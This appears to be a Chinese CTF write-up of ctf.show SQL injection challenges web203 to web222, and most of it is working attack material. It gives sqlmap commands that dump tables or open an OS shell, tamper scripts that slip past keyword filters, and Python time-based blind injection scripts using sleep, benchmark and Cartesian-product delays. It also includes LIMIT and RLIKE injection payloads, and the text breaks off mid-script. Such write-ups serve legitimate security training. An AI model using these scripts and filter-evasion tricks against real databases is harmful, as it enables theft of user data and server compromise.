//拼接sql语句查找指定ID用户 $sql = \u0026#34;select id,username,password from ctfshow_user where username !=\u0026#39;flag\u0026#39; and id = \u0026#39;\u0026#34;.$_GET[\u0026#39;id\u0026#39;].\u0026#34;\u0026#39;;\u0026#34;; 返回逻辑 //对传入的参数进行了过滤 function waf($str){ //代码过于简单，不宜展示 } \u0026ndash;headers=\u0026ldquo;Content-Type: text/plain\u0026rdquo; 以表单形式发送\nsqlmap -u \u0026#34;http://29e626b4-75fb-4058-98af-126d2bf725c5.challenge.ctf.show/api/index.php\u0026#34; --method=\u0026#34;PUT\u0026#34; --data=\u0026#34;id=1\u0026#34; --referer=ctf.show --headers=\u0026#34;Content-Type: text/plain\u0026#34; -D ctfshow_web -T ctfshow_user -C pass --dump web204 使用--cookie 提交cookie数据 payload:\nsqlmap -u \u0026#34;http://c07422b1-5bde-4baa-9e8c-73ef4edfa83a.challenge.ctf.show/api/index.php\u0026#34; --method=\u0026#34;PUT\u0026#34; --data=\u0026#34;id=1\u0026#34; --referer=ctf.show --headers=\u0026#34;Content-Type: text/plain\u0026#34; --cookie=\u0026#34;PHPSESSID:eqf4q2s5ma4u4vtj31sf25lbp5;ctfshow:d5d0917 6f63d87074e926a342a996872\u0026#34; -D ctfshow_web -T ctfshow_user -C pass --dump web205 api调用需要鉴权 通过抓包分析，在每次请求url/api/index.php之前需要先请求URL/api/getTokn.php\npayload：\nsqlmap -u \u0026#34;http://24e98b18-4f9a-4a11-a265-5022e0e3fb05.challenge.ctf.show/api/index.php\u0026#34; --method=\u0026#34;PUT\u0026#34; --data=\u0026#34;id=1\u0026#34; --referer=ctf.show --headers=\u0026#34;Content-Type: text/plain\u0026#34; --cookie=\u0026#34;PHPSESSID=60prkqe8189934t5pv3ikepa16\u0026#34; --safe-url=\u0026#34;http://24e98b18-4f9a-4a11-a265-5022e0e3fb05.challenge.ctf.show/api/getToken.php\u0026#34; --safe-freq=1 -D ctfshow_web -T ctfshow_flax --dump web206 sql需要闭合 //拼接sql语句查找指定ID用户 $sql = \u0026#34;select id,username,pass from ctfshow_user where id = (\u0026#39;\u0026#34;.$id.\u0026#34;\u0026#39;) limit 0,1;\u0026#34;; sqlmap会自动构造闭合，所以跟前一题没什么区别\n但是也可以手动构造一下\npayload:\n根据sql语句，我们采用“)#”的方式进行右闭合。----suffix=\u0026#34;)#\u0026#34; 执行sqlmap命令行 sqlmap -u \u0026#34;http://aae90b40-e094-482a-bbe1-eabb586a4291.challenge.ctf.show/api/index.php\u0026#34; --data \u0026#34;id=1\u0026#34; --user-agent=sqlmap --referer=ctf.show --method=put --headers=\u0026#34;Content-Type:text/plain\u0026#34; --cookie=\u0026#34;PHPSESSID=sie3k7c33euvbk2s2753f6n0j0;\u0026#34; --safe-url=\u0026#34;https://aae90b40-e094-482a-bbe1-eabb586a4291.challenge.ctf.show/api/getToken.php\u0026#34; --safe-freq=1 --suffix=\u0026#34;)#\u0026#34; --dbs sqlmap -u \u0026#34;http://00b4cc54-fdc1-4b6a-ada7-bc509824917a.challenge.ctf.show/api/index.php\u0026#34; --data \u0026#34;id=1\u0026#34; --user-agent=sqlmap --referer=ctf.show --method=put --headers=\u0026#34;Content-Type:text/plain\u0026#34; --cookie=\u0026#34;PHPSESSID=lb4lslploh7thdl0hdsd1008f9;\u0026#34; --safe-url=\u0026#34;https://00b4cc54-fdc1-4b6a-ada7-bc509824917a.challenge.ctf.show/api/getToken.php\u0026#34; --safe-freq=1 --suffix=\u0026#34;)#\u0026#34; -D ctfshow_web --tables sqlmap -u http://52acc440-2ed1-4b93-b3af-171d78632ae7.challenge.ctf.show/api/index.php --method=PUT --data=\u0026#34;id=1\u0026#34; --referer=ctf.show --dbms=mysql -D \u0026#34;ctfshow_web\u0026#34; -T \u0026#34;ctfshow_flaxc\u0026#34; -C \u0026#34;flagv\u0026#34; --dump --headers=\u0026#34;Content-Type: text/plain\u0026#34; --safe-url=http://52acc440-2ed1-4b93-b3af-171d78632ae7.challenge.ctf.show/api/getToken.php --safe-freq=1 web207 Sqlmap Tamper 编写\n示例\n1#!/usr/bin/env python 2 3\u0026#34;\u0026#34;\u0026#34; 4Copyright (c) 2006-2019 sqlmap developers (http://sqlmap.org/) 5See the file \u0026#39;doc/COPYING\u0026#39; for copying permission 6\u0026#34;\u0026#34;\u0026#34; 7 8from lib.core.enums import PRIORITY 9__priority__ = PRIORITY.LOW # 当前脚本调用优先等级 10 11def dependencies(): # 声明当前脚本适用/不适用的范围，可以为空。 12 pass 13 14def tamper(payload, **kwargs): # 用于篡改Payload、以及请求头的主要函数 15 return payload 题目\n查询语句 //拼接sql语句查找指定ID用户 $sql = \u0026#34;select id,username,pass from ctfshow_user where id = (\u0026#39;\u0026#34;.$id.\u0026#34;\u0026#39;) limit 0,1;\u0026#34;; 返回逻辑 //对传入的参数进行了过滤 function waf($str){ return preg_match(\u0026#39;/ /\u0026#39;, $str); } 这里会将waf中的关键词替换成空格\n放一个Y4tacker大佬的脚本\n1#!/usr/bin/env python 2\u0026#34;\u0026#34;\u0026#34; 3Author:Y4tacker 4\u0026#34;\u0026#34;\u0026#34; 5 6# 假设在Python 3环境中运行，将xrange替换为range 7# 从lib.core.enums模块中导入PRIORITY枚举类型 8from lib.core.enums import PRIORITY 9 10# 设置脚本的优先级为低 11__priority__ = PRIORITY.LOW 12 13def tamper(payload, **kwargs): 14 \u0026#34;\u0026#34;\u0026#34; 15 篡改函数，调用space2comment函数对有效负载进行处理 16 :param payload: 待处理的有效负载 17 :param kwargs: 其他关键字参数 18 :return: 处理后的有效负载 19 \u0026#34;\u0026#34;\u0026#34; 20 payload = space2comment(payload) 21 return payload 22 23def space2comment(payload): 24 \u0026#34;\u0026#34;\u0026#34; 25 将有效负载中的空格字符替换为换行符 26 :param payload: 待处理的有效负载 27 :return: 处理后的有效负载 28 \u0026#34;\u0026#34;\u0026#34; 29 retVal = payload 30 if payload: 31 retVal = \u0026#34;\u0026#34; 32 # 用于跟踪是否在单引号内 33 quote = False 34 # 用于跟踪是否在双引号内 35 doublequote = False 36 # 用于跟踪是否遇到第一个空格 37 firstspace = False 38 39 for i in range(len(payload)): 40 if not firstspace: 41 if payload[i].isspace(): 42 firstspace = True 43 retVal += chr(0x0a) 44 continue 45 46 elif payload[i] == \u0026#39;\\\u0026#39;\u0026#39;: 47 # 取反quote的值 48 quote = not quote 49 50 elif payload[i] == \u0026#39;\u0026#34;\u0026#39;: 51 # 取反doublequote的值 52 doublequote = not doublequote 53 54 elif payload[i] == \u0026#34; \u0026#34; and not doublequote and not quote: 55 retVal += chr(0x0a) 56 continue 57 58 retVal += payload[i] 59 60 return retVal 其实这段代码的目的就是将payload中的空格替换成换行符\n其实直接用sqlmap自带的sapce2comment模板\nsqlmap -u \u0026#34;http://7bf5dfc3-3078-441f-b245-64dab6933839.challenge.ctf.show/api/index.php\u0026#34; --method=put --data=\u0026#34;id=1\u0026#34; --headers=\u0026#34;Content-Type: text/plain\u0026#34; --cookie=\u0026#34;PHPSESSID=btkhe9vojj5a7piadlc51ubifk;\u0026#34; --referer=ctf.show -D ctfshow_web --safe-url=\u0026#34;http://7bf5dfc3-3078-441f-b245-64dab6933839.challenge.ctf.show/api/getToken.php\u0026#34; --safe-freq=1 --tamper=space2comment -T ctfshow_flaxca --dump web208 同上一题\nsqlmap -u \u0026#34;http://f287c31a-5cae-478d-af39-de7010c92def.challenge.ctf.show/api/index.php\u0026#34; --method=put --data=\u0026#34;id=1\u0026#34; --headers=\u0026#34;Content-Type: text/plain\u0026#34; --cookie=\u0026#34;PHPSESSID=3e08elobpci83dm5l8mn4hd18k;\u0026#34; --referer=ctf.show -D ctfshow_web --safe-url=\u0026#34;http://f287c31a-5cae-478d-af39-de7010c92def.challenge.ctf.show/api/getToken.php\u0026#34; --safe-freq=1 --tamper=space2comment -T ctfshow_flaxcac --dump web209 这题新增了点waf\n查询语句 //拼接sql语句查找指定ID用户 $sql = \u0026#34;select id,username,pass from ctfshow_user where id = \u0026#39;\u0026#34;.$id.\u0026#34;\u0026#39; limit 0,1;\u0026#34;; 返回逻辑 //对传入的参数进行了过滤 function waf($str){ //TODO 未完工 return preg_match(\u0026#39;/ |\\*|\\=/\u0026#39;, $str); } Y4tacker大佬的tamper\n1#!/usr/bin/env python 2\u0026#34;\u0026#34;\u0026#34; 3Author:Y4tacker 4\u0026#34;\u0026#34;\u0026#34; 5 6from lib.core.compat import xrange 7from lib.core.enums import PRIORITY 8 9__priority__ = PRIORITY.LOW 10 11 12def tamper(payload, **kwargs): 13 payload = space2comment(payload) 14 return payload 15 16 17def space2comment(payload): 18 retVal = payload 19 if payload: 20 retVal = \u0026#34;\u0026#34; 21 quote, doublequote, firstspace = False, False, False 22 23 for i in xrange(len(payload)): 24 if not firstspace: 25 if payload[i].isspace(): 26 firstspace = True 27 retVal += chr(0x0a) 28 continue 29 30 elif payload[i] == \u0026#39;\\\u0026#39;\u0026#39;: 31 quote = not quote 32 33 elif payload[i] == \u0026#39;\u0026#34;\u0026#39;: 34 doublequote = not doublequote 35 36 elif payload[i] == \u0026#34;*\u0026#34;: 37 retVal += chr(0x31) 38 continue 39 40 elif payload[i] == \u0026#34;=\u0026#34;: 41 retVal += chr(0x0a)+\u0026#39;like\u0026#39;+chr(0x0a) 42 continue 43 44 elif payload[i] == \u0026#34; \u0026#34; and not doublequote and not quote: 45 retVal += chr(0x0a) 46 continue 47 48 retVal += payload[i] 49 50 return retVal 其实也不用写这么复杂\n直接这样也ok的\n1#!/usr/bin/env python 2 3from lib.core.enums import PRIORITY 4 5__priority__ = PRIORITY.NORMAL 6 7def dependencies(): 8 pass 9 10 11def tamper(payload, **kwargs): 12 return payload.replace(\u0026#34;=\u0026#34;, \u0026#34; like \u0026#34;).replace(\u0026#34; \u0026#34;, chr(0x09)) payload:\npython sqlmap.py -u \u0026#34;http://aaa64ad5-5bc1-470b-b485-0549641a1327.challenge.ctf.show/api/index.php\u0026#34; --method=put --data=\u0026#34;id=1\u0026#34; --headers=\u0026#34;Content-Type: text/plain\u0026#34; --cookie=\u0026#34;PHPSESSID=3oemcboib377tes0fi7ltgh9ba;\u0026#34; --referer=ctf.show -D ctfshow_web --safe-url=\u0026#34;http://aaa64ad5-5bc1-470b-b485-0549641a1327.challenge.ctf.show/api/getToken.php\u0026#34; --safe-freq=1 --tamper=web209 -T ctfshow_flav --dump web210 查询语句 //拼接sql语句查找指定ID用户 $sql = \u0026#34;select id,username,pass from ctfshow_user where id = \u0026#39;\u0026#34;.$id.\u0026#34;\u0026#39; limit 0,1;\u0026#34;; 返回逻辑 //对查询字符进行解密 function decode($id){ return strrev(base64_decode(strrev(base64_decode($id)))); } 这题会对查询的字符进行两次的base64解密和两次的反转\n那我们只需要修改tamper，使传入的payload进行两次base64加密即可\n1#!/usr/bin/env python 2 3from lib.core.enums import PRIORITY 4import base64 5 6__priority__ = PRIORITY.NORMAL 7 8def dependencies(): 9 pass 10 11 12def tamper(payload, **kwargs): 13 rev1 = payload[::-1].encode() 14 encode1 = base64.b64encode(rev1).decode() 15 rev2 = encode1[::-1].encode() 16 encode2 = base64.b64encode(rev2).decode() 17 return encode2 payload:\npython sqlmap.py -u \u0026#34;http://35600981-0e61-43e6-85ce-38d9cc6eeaf5.challenge.ctf.show/api/index.php\u0026#34; --method=put --data=\u0026#34;id=1\u0026#34; --headers=\u0026#34;Content-Type: text/plain\u0026#34; --cookie=\u0026#34;PHPSESSID=bffum6tr2u1k3h8l9bgtkst4ni;\u0026#34; --referer=ctf.show -D ctfshow_web --safe-url=\u0026#34;http://35600981-0e61-43e6-85ce-38d9cc6eeaf5.challenge.ctf.show/api/getToken.php\u0026#34; --safe-freq=1 --tamper=web210 -T ctfshow_flavi --dump web211 查询语句 //拼接sql语句查找指定ID用户 $sql = \u0026#34;select id,username,pass from ctfshow_user where id = \u0026#39;\u0026#34;.$id.\u0026#34;\u0026#39; limit 0,1;\u0026#34;; 返回逻辑 //对查询字符进行解密 function decode($id){ return strrev(base64_decode(strrev(base64_decode($id)))); } function waf($str){ return preg_match(\u0026#39;/ /\u0026#39;, $str); } 增加了空格waf\n问题不大\n1#!/usr/bin/env python 2 3from lib.core.enums import PRIORITY 4import base64 5 6__priority__ = PRIORITY.NORMAL 7 8def dependencies(): 9 pass 10 11 12def tamper(payload, **kwargs): 13\t14 payload0 = payload.replace(\u0026#34; \u0026#34;, chr(0x09)) 15 rev1 = payload0[::-1].encode() 16 encode1 = base64.b64encode(rev1).decode() 17 rev2 = encode1[::-1].encode() 18 encode2 = base64.b64encode(rev2).decode() 19 return encode2 payload\npython sqlmap.py -u \u0026#34;http://f9c9297a-3dc9-496e-8d15-33e170db0df8.challenge.ctf.show/api/index.php\u0026#34; --method=put --data=\u0026#34;id=1\u0026#34; --headers=\u0026#34;Content-Type: text/plain\u0026#34; --cookie=\u0026#34;PHPSESSID=ibn3o3imhq85l1043f80nbdova;\u0026#34; --referer=ctf.show -D ctfshow_web --safe-url=\u0026#34;http://f9c9297a-3dc9-496e-8d15-33e170db0df8.challenge.ctf.show/api/getToken.php\u0026#34; --safe-freq=1 --tamper=web211 -T ctfshow_flavia --dump web212 1查询语句 2 3//拼接sql语句查找指定ID用户 4$sql = \u0026#34;select id,username,pass from ctfshow_user where id = \u0026#39;\u0026#34;.$id.\u0026#34;\u0026#39; limit 0,1;\u0026#34;; 5 6返回逻辑 7 8//对查询字符进行解密 9 function decode($id){ 10 return strrev(base64_decode(strrev(base64_decode($id)))); 11 } 12function waf($str){ 13 return preg_match(\u0026#39;/ |\\*/\u0026#39;, $str); 14} waf增加了*\n但是不影响上一题的tamper\npython sqlmap.py -u \u0026#34;http://2055229c-7666-493e-9329-2cdc56d820ed.challenge.ctf.show/api/index.php\u0026#34; --method=put --data=\u0026#34;id=1\u0026#34; --headers=\u0026#34;Content-Type: text/plain\u0026#34; --cookie=\u0026#34;PHPSESSID=72duisds4cprdqlbtf4fu4389d;\u0026#34; --referer=ctf.show -D ctfshow_web --safe-url=\u0026#34;http://2055229c-7666-493e-9329-2cdc56d820ed.challenge.ctf.show/api/getToken.php\u0026#34; --safe-freq=1 --tamper=web211 -T ctfshow_flavis --dump web213 1查询语句 2 3//拼接sql语句查找指定ID用户 4$sql = \u0026#34;select id,username,pass from ctfshow_user where id = \u0026#39;\u0026#34;.$id.\u0026#34;\u0026#39; limit 0,1;\u0026#34;; 5 6返回逻辑 7 8//对查询字符进行解密 9 function decode($id){ 10 return strrev(base64_decode(strrev(base64_decode($id)))); 11 } 12function waf($str){ 13 return preg_match(\u0026#39;/ |\\*/\u0026#39;, $str); 14} 根据提示，用\u0026ndash;os-shell拿到shell读flag\n其他跟上题一样\npayload:\npython sqlmap.py -u \u0026#34;http://341989d1-8945-4c5d-b70e-2d69a0f850b1.challenge.ctf.show/api/index.php\u0026#34; --method=put --data=\u0026#34;id=1\u0026#34; --headers=\u0026#34;Content-Type: text/plain\u0026#34; --cookie=\u0026#34;PHPSESSID=66ddslui3ejn3b4pa6437qm60j;\u0026#34; --referer=ctf.show --safe-url=\u0026#34;http://341989d1-8945-4c5d-b70e-2d69a0f850b1.challenge.ctf.show/api/getToken.php\u0026#34; --safe-freq=1 --tamper=web211 --os-shell 时间盲注 web214 这道题没给出注入点\n主页找到select.js中，测试后发现ip为注入点\n1import requests 2 3url = \u0026#34;http://fe78d582-57da-4291-845f-1e8ff2936104.challenge.ctf.show/api/\u0026#34; 4result = \u0026#34;\u0026#34; 5i = 0 6 7while True: 8 i = i + 1 9 # ASCII码范围，32到127是可打印字符的范围 10 head = 32 11 tail = 127 12 13 while head \u0026lt; tail: 14 # 二分查找的中间值 15 mid = (head + tail) \u0026gt;\u0026gt; 1 16\t# 查表名 17 # payload = \u0026#34;select group_concat(table_name) from information_schema.tables where table_schema=database()\u0026#34; 18 # 查列名 19 # payload = \u0026#34;select group_concat(column_name) from information_schema.columns where table_name=\u0026#39;ctfshow_flagx\u0026#39;\u0026#34; 20 # 爆字段 21 payload = \u0026#34;select flaga from ctfshow_flagx\u0026#34; 22 data = { 23 \u0026#39;ip\u0026#39;: f\u0026#34;if(ascii(substr(({payload}),{i},1))\u0026gt;{mid},sleep(1),1)\u0026#34;, 24 \u0026#39;debug\u0026#39;: \u0026#39;0\u0026#39; 25 } 26 try: 27 # 发送POST请求，设置超时时间为1秒 28 r = requests.post(url, data=data, timeout=1) 29 # 如果请求在1秒内返回，说明当前位置字符的ASCII码小于等于中间值 30 tail = mid 31 except requests.exceptions.Timeout: 32 # 如果请求超时，说明当前位置字符的ASCII码大于中间值 33 head = mid + 1 34 except Exception as e: 35 print(f\u0026#34;An unexpected error occurred: {e}\u0026#34;) 36 break 37 38 if head != 32: 39 # 如果找到有效的字符，将其添加到结果字符串中 40 result += chr(head) 41 else: 42 # 如果没有找到有效字符，退出循环 43 break 44 print(\u0026#34;[*]Result : \u0026#34;+result) web215 上题脚本改一改\n1import requests 2 3url = \u0026#34;http://08e16d35-1a8c-4ed7-9e9e-760a32aa0756.challenge.ctf.show/api/\u0026#34; 4result = \u0026#34;\u0026#34; 5i = 0 6 7while True: 8 i = i + 1 9 # ASCII码范围，32到127是可打印字符的范围 10 head = 32 11 tail = 127 12 13 while head \u0026lt; tail: 14 # 二分查找的中间值 15 mid = (head + tail) \u0026gt;\u0026gt; 1 16\t# 查表名 17 payload = \u0026#34;select group_concat(table_name) from information_schema.tables where table_schema=database()\u0026#34; 18 # 查列名 19 # payload = \u0026#34;select group_concat(column_name) from information_schema.columns where table_name=\u0026#39;ctfshow_flagx\u0026#39;\u0026#34; 20 # 爆字段 21 # payload = \u0026#34;select flaga from ctfshow_flagx\u0026#34; 22 data = { 23 \u0026#39;ip\u0026#39;: f\u0026#34;1\u0026#39; or if(ascii(substr(({payload}),{i},1))\u0026gt;{mid},sleep(1),1)#\u0026#34;, 24 \u0026#39;debug\u0026#39;: \u0026#39;0\u0026#39; 25 } 26 try: 27 # 发送POST请求，设置超时时间为1秒 28 r = requests.post(url, data=data, timeout=1) 29 # 如果请求在1秒内返回，说明当前位置字符的ASCII码小于等于中间值 30 tail = mid 31 except requests.exceptions.Timeout: 32 # 如果请求超时，说明当前位置字符的ASCII码大于中间值 33 head = mid + 1 34 except Exception as e: 35 print(f\u0026#34;An unexpected error occurred: {e}\u0026#34;) 36 break 37 38 if head != 32: 39 # 如果找到有效的字符，将其添加到结果字符串中 40 result += chr(head) 41 else: 42 # 如果没有找到有效字符，退出循环 43 break 44 print(\u0026#34;[*]Result : \u0026#34;+result) web216 构造闭合即可\n1import requests 2 3url = \u0026#34;http://d3d3aa4e-87f5-454c-b589-826971f59bbb.challenge.ctf.show/api/\u0026#34; 4result = \u0026#34;\u0026#34; 5i = 0 6 7while True: 8 i = i + 1 9 # ASCII码范围，32到127是可打印字符的范围 10 head = 32 11 tail = 127 12 13 while head \u0026lt; tail: 14 # 二分查找的中间值 15 mid = (head + tail) \u0026gt;\u0026gt; 1 16\t# 查表名 17 # payload = \u0026#34;select group_concat(table_name) from information_schema.tables where table_schema=database()\u0026#34; 18 # 查列名 19 # payload = \u0026#34;select group_concat(column_name) from information_schema.columns where table_name=\u0026#39;ctfshow_flagxcc\u0026#39;\u0026#34; 20 # 爆字段 21 payload = \u0026#34;select flagaac from ctfshow_flagxcc\u0026#34; 22 data = { 23 \u0026#39;ip\u0026#39;: f\u0026#34;\u0026#39;\u0026#39;) or if(ascii(substr(({payload}),{i},1))\u0026gt;{mid},sleep(1),1)#\u0026#34;, 24 \u0026#39;debug\u0026#39;: \u0026#39;0\u0026#39; 25 } 26 try: 27 # 发送POST请求，设置超时时间为1秒 28 r = requests.post(url, data=data, timeout=1) 29 # 如果请求在1秒内返回，说明当前位置字符的ASCII码小于等于中间值 30 tail = mid 31 except requests.exceptions.Timeout: 32 # 如果请求超时，说明当前位置字符的ASCII码大于中间值 33 head = mid + 1 34 except Exception as e: 35 print(f\u0026#34;An unexpected error occurred: {e}\u0026#34;) 36 break 37 38 if head != 32: 39 # 如果找到有效的字符，将其添加到结果字符串中 40 result += chr(head) 41 else: 42 # 如果没有找到有效字符，退出循环 43 break 44 print(\u0026#34;[*]Result : \u0026#34;+result) web217 这题waf了sleep\n可以改用benchmark\n在 MySQL 中，benchmark函数用于测试表达式执行的性能。它的语法是benchmark(count,expr)，其中count是要执行expr的次数，expr是要测试的表达式。 例如，benchmark(10000000,sha(1))表示将sha(1)这个表达式执行 10000000 次。sha(1)是计算字符串'1'的 SHA - 1 哈希值。 1import requests 2import time 3 4url = \u0026#34;http://b5d4a386-1612-4c40-b14c-e9103a54188c.challenge.ctf.show/api/\u0026#34; 5result = \u0026#34;\u0026#34; 6i = 0 7 8while True: 9 i = i + 1 10 # ASCII码范围，32到127是可打印字符的范围 11 head = 32 12 tail = 127 13 14 while head \u0026lt; tail: 15 # 二分查找的中间值 16 mid = (head + tail) \u0026gt;\u0026gt; 1 17 # 查数据库 18 # payload = \u0026#34;select group_concat(table_name) from information_schema.tables where table_schema=database()\u0026#34; 19 # 查列名字 20 # payload = \u0026#34;select column_name from information_schema.columns where table_name=\u0026#39;ctfshow_flagxccb\u0026#39; limit 1,1\u0026#34; 21 # 查数据 22 payload = \u0026#34;select flagaabc from ctfshow_flagxccb\u0026#34; 23 data = { 24 \u0026#39;ip\u0026#39;: f\u0026#34;1) or if(ascii(substr(({payload}),{i},1))\u0026gt;{mid},benchmark(1000000,sha(1)),1)#\u0026#34;, 25 \u0026#39;debug\u0026#39;: \u0026#39;0\u0026#39; 26 } 27 try: 28 # 发送POST请求，设置超时时间为1秒 29 r = requests.post(url, data=data, timeout=0.33) 30 # 如果请求在1秒内返回，说明当前位置字符的ASCII码小于等于中间值 31 time.sleep(1) 32 tail = mid 33 except requests.exceptions.Timeout: 34 # 如果请求超时，说明当前位置字符的ASCII码大于中间值 35 time.sleep(1) 36 head = mid + 1 37 except Exception as e: 38 time.sleep(1) 39 print(f\u0026#34;An unexpected error occurred: {e}\u0026#34;) 40 break 41 42 if head != 32: 43 # 如果找到有效的字符，将其添加到结果字符串中 44 result += chr(head) 45 else: 46 # 如果没有找到有效字符，退出循环 47 break 48 49 print(\u0026#34;[*]Result : \u0026#34;+result) benchmark的设置比较苛刻，要多试试\n最好不要设置太大，环境会崩\nweb218 1查询语句 2 3 where id = ($id); 4 5返回逻辑 6 7 //屏蔽危险分子 8 function waf($str){ 9 return preg_match(\u0026#39;/sleep|benchmark/i\u0026#39;,$str); 10 } 11 这题sleep和benchmark都被ban掉了\n可以考虑用笛卡尔积盲注\n参考文章：SQL注入经验-大负荷注入-腾讯云开发者社区-腾讯云\n1import requests 2import time 3 4url = \u0026#34;http://a17ea2c9-7463-4d5a-bfa5-2f6bdcd2daf1.challenge.ctf.show/api/\u0026#34; 5result = \u0026#34;\u0026#34; 6i = 0 7 8while True: 9 i = i + 1 10 # ASCII码范围，32到127是可打印字符的范围 11 head = 32 12 tail = 127 13 14 while head \u0026lt; tail: 15 # 二分查找的中间值 16 mid = (head + tail) \u0026gt;\u0026gt; 1 17 18 # payload = \u0026#34;select table_name from information_schema.tables where table_schema=database() limit 0,1\u0026#34; 19 # payload = \u0026#34;select column_name from information_schema.columns where table_name=\u0026#39;ctfshow_flagxc\u0026#39; limit 1,1\u0026#34; 20 payload = \u0026#34;select flagaac from ctfshow_flagxc\u0026#34; 21 data = { 22 \u0026#39;ip\u0026#39;: f\u0026#34;1) or if(ascii(substr(({payload}),{i},1))\u0026gt;{mid},(select count(*) from information_schema.columns A, information_schema.columns B),1)#\u0026#34;, 23 \u0026#39;debug\u0026#39;: \u0026#39;1\u0026#39; 24 } 25 try: 26 # 发送POST请求，设置超时时间为1秒 27 r = requests.post(url, data=data, timeout=0.15) 28 # 如果请求在1秒内返回，说明当前位置字符的ASCII码小于等于中间值 29 time.sleep(0.2) 30 tail = mid 31 except requests.exceptions.Timeout: 32 # 如果请求超时，说明当前位置字符的ASCII码大于中间值 33 time.sleep(0.2) 34 head = mid + 1 35 except Exception as e: 36 time.sleep(0.2) 37 print(f\u0026#34;An unexpected error occurred: {e}\u0026#34;) 38 break 39 40 if head != 32: 41 # 如果找到有效的字符，将其添加到结果字符串中 42 result += chr(head) 43 else: 44 # 如果没有找到有效字符，退出循环 45 break 46 47 print(\u0026#34;[*]Result : \u0026#34;+result) 48 49# ctfshow{d317911f-ac1e-4160-be70-47d01a0f2f45} 乱码的话，多跑几次就好了\n另一种方法就是通过正则 DOS RLIKE注入\n利用 SQL 多次计算正则消耗计算资源产生延时效果，与 benchmark 原理类似，通过 rpad 或 repeat 构造长字符串，以计算量大的 pattern。\ndebug=1\u0026amp;ip=repeat(rpad(\u0026#39;a\u0026#39;, 999999, \u0026#39;a\u0026#39;),16) rlike concat(repeat(\u0026#39;(a.*)+\u0026#39;,14), \u0026#39;b\u0026#39;) web219 查询语句 where id = ($id); 返回逻辑 //屏蔽危险分子 function waf($str){ return preg_match(\u0026#39;/sleep|benchmark|rlike/i\u0026#39;,$str); } 继续使用笛卡尔积盲注即可\n1import requests 2import time 3 4url = \u0026#34;http://61d55d79-847e-43d7-80e4-c221ceae9f4a.challenge.ctf.show/api/\u0026#34; 5result = \u0026#34;\u0026#34; 6i = 0 7 8while True: 9 i = i + 1 10 # ASCII码范围，32到127是可打印字符的范围 11 head = 32 12 tail = 127 13 14 while head \u0026lt; tail: 15 # 二分查找的中间值 16 mid = (head + tail) \u0026gt;\u0026gt; 1 17 18 # payload = \u0026#34;select table_name from information_schema.tables where table_schema=database() limit 0,1\u0026#34; 19 # payload = \u0026#34;select column_name from information_schema.columns where table_name=\u0026#39;ctfshow_flagxca\u0026#39; limit 1,1\u0026#34; 20 payload = \u0026#34;select flagaabc from ctfshow_flagxca\u0026#34; 21 22 data = { 23 \u0026#39;ip\u0026#39;: f\u0026#34;1) or if(ascii(substr(({payload}),{i},1))\u0026gt;{mid},(select count(*) from information_schema.columns A, information_schema.columns B),1)#\u0026#34;, 24 \u0026#39;debug\u0026#39;: \u0026#39;1\u0026#39; 25 } 26 try: 27 # 发送POST请求，设置超时时间为1秒 28 r = requests.post(url, data=data, timeout=0.15) 29 # 如果请求在1秒内返回，说明当前位置字符的ASCII码小于等于中间值 30 time.sleep(0.2) 31 tail = mid 32 except requests.exceptions.Timeout: 33 # 如果请求超时，说明当前位置字符的ASCII码大于中间值 34 time.sleep(0.2) 35 head = mid + 1 36 except Exception as e: 37 time.sleep(0.2) 38 print(f\u0026#34;An unexpected error occurred: {e}\u0026#34;) 39 break 40 41 if head != 32: 42 # 如果找到有效的字符，将其添加到结果字符串中 43 result += chr(head) 44 else: 45 # 如果没有找到有效字符，退出循环 46 break 47 48 print(\u0026#34;[*]Result : \u0026#34;+result) web220 查询语句 where id = ($id); 返回逻辑 //屏蔽危险分子 function waf($str){ return preg_match(\u0026#39;/sleep|benchmark|rlike|ascii|hex|concat_ws|concat|mid|substr/i\u0026#39;,$str); } substr用left代替即可，有点像之前布尔盲注的一道题，只是改成了时间盲注罢了\n1import requests 2import string 3import time 4 5url = \u0026#34;http://52728b9a-ffae-4f96-b51f-0549bb5cb4e0.challenge.ctf.show/api/\u0026#34; 6str=\u0026#34; _{}-\u0026#34; + string.ascii_lowercase + string.digits 7result = \u0026#39;\u0026#39; 8for i in range(1,45): 9 for j in str: 10 # payload = \u0026#34;select table_name from information_schema.tables where table_schema=database() limit 0,1\u0026#34; 11 # payload = \u0026#34;select column_name from information_schema.columns where table_name=\u0026#39;ctfshow_flagxcac\u0026#39; limit 1,1\u0026#34; 12 payload = \u0026#34;select flagaabcc from ctfshow_flagxcac\u0026#34; 13 14 data = { 15 \u0026#39;ip\u0026#39;: f\u0026#34;1) or if(LEFT(({payload}),{i})regexp(\u0026#39;{result+j}\u0026#39;),(select count(*) from information_schema.columns A, information_schema.columns B),1)#\u0026#34;, 16 \u0026#39;debug\u0026#39;: 0 17 } 18 try: 19 r = requests.post(url, data=data, timeout=0.15) 20 time.sleep(0.2) 21 except Exception as e: 22 time.sleep(0.2) 23 result = result + j 24 print(\u0026#34;[*] loading :\u0026#34;+result) 25 break 26 27print(\u0026#34;[*] result :\u0026#34;+result) web221 1查询语句 2 3 //分页查询 4 $sql = select * from ctfshow_user limit ($page-1)*$limit,$limit; 5 6返回逻辑 7 8//TODO:很安全，不需要过滤 9//拿到数据库名字就算你赢 p神的文章有提到limit注入\n[转载]Mysql下Limit注入方法 | 离别歌\npayload:\n?page=1\u0026amp;limit=1%20procedure%20analyse(extractvalue(rand(),concat(0x3a,database())),1) group注入 web222 查询语句 //分页查询 $sql = select * from ctfshow_user group by $username; 返回逻辑 //TODO:很安全，不需要过滤 group by 可以进行时间盲注，布尔盲注等\n本来以为是报错注入的，发现好像不太行\n还是的时间盲注\n拿前面的盲注脚本改一改\n1import requests 2import time 3url = \u0026#34;http://529d9311-c036-4831-bfa1-b2ca91dae190.challenge.ctf.show/api/?u=\u0026#34; 4result = \u0026#34;\u0026#34; 5i = 0 6 7while True: 8 i = i + 1 9 # ASCII码范围，32到127是可打印字符的范围 10 head = 32 11 tail = 127 12 13 while head \u0026lt; tail: 14 # 二分查找的中间值 15 mid = (head + tail) \u0026gt;\u0026gt; 1 16 # 查表名 17 # payload = \u0026#34;select group_concat(table_name) from information_schema.tables where table_schema=database()\u0026#34; 18 # 查列名字 19 # payload = \u0026#34;select column_name from information_schema.columns where table_name=\u0026#39;ctfshow_flaga\u0026#39; limit 1,1\u0026#34; 20 # 爆字段 21 payload = \u0026#34;select flagaabc from ctfshow_flaga\u0026#34; 22 23 data = f\u0026#34;concat((if (ascii(substr(({payload}),{i},1))\u0026gt;{mid}, sleep(0.05), 2)), 1);\u0026#34; 24 25 try: 26 r = requests.post(url+data, timeout=0.05) 